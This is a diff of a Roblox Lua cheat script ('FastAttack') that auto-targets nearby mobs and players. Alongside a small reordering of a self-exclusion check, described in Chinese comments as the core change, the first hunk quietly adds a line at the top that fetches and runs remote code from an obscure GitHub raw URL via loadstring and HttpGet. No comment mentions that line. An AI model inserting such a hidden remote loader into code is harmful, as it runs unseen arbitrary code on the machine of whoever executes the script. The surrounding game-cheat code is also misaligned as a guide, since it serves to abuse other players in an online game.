@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XAORKG/XGHDVK/refs/heads/main/XOOOP"))()
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -95,7 +96,8 @@ if _G.FastAttack then
             if not Folder or not FastAttack.attackMobs then return nil end
             local BasePart = nil
             for _, Enemy in Folder:GetChildren() do
-                if not IsAlive(Enemy) or Enemy == Player.Character then continue end
+                -- 先排除自身，再判断是否存活（核心修改）
+                if Enemy == Player.Character or not IsAlive(Enemy) then continue end
                 local TargetPart = Enemy:FindFirstChild("Head")
                     or Enemy:FindFirstChild("Torso")
                     or Enemy:FindFirstChild("UpperTorso")
@@ -112,6 +114,7 @@ if _G.FastAttack then
             if not FastAttack.attackPlayers then return nil end
             local BasePart = nil
             for _, OtherPlayer in Players:GetPlayers() do
+                -- 先排除自身账号（原逻辑已在前面，无需改，保留即可）
                 if OtherPlayer == Player then continue end
                 local OtherChar = OtherPlayer.Character
                 if not IsAlive(OtherChar) then continue end
@@ -320,7 +323,8 @@ task.spawn(function()
                                 if not Folder or not FastAttack.attackMobs then return nil end
                                 local BasePart = nil
                                 for _, Enemy in Folder:GetChildren() do
-                                    if not IsAlive(Enemy) or Enemy == Player.Character then continue end
+                                    -- 先排除自身，再判断是否存活（核心修改）
+                                    if Enemy == Player.Character or not IsAlive(Enemy) then continue end
                                     local TargetPart = Enemy:FindFirstChild("Head") or Enemy:FindFirstChild("Torso") or Enemy:FindFirstChild("UpperTorso") or Enemy:FindFirstChild("HumanoidRootPart")
                                     if TargetPart and Player:DistanceFromCharacter(TargetPart.Position) < FastAttack.Distance then
                                         table.insert(OthersEnemies, { Enemy, TargetPart })
@@ -333,6 +337,7 @@ task.spawn(function()
                                 if not FastAttack.attackPlayers then return nil end
                                 local BasePart = nil
                                 for _, OtherPlayer in Players:GetPlayers() do
+                                    -- 先排除自身账号（原逻辑已在前面，无需改，保留即可）
                                     if OtherPlayer == Player then continue end
                                     local OtherChar = OtherPlayer.Character
                                     if not IsAlive(OtherChar) then continue end
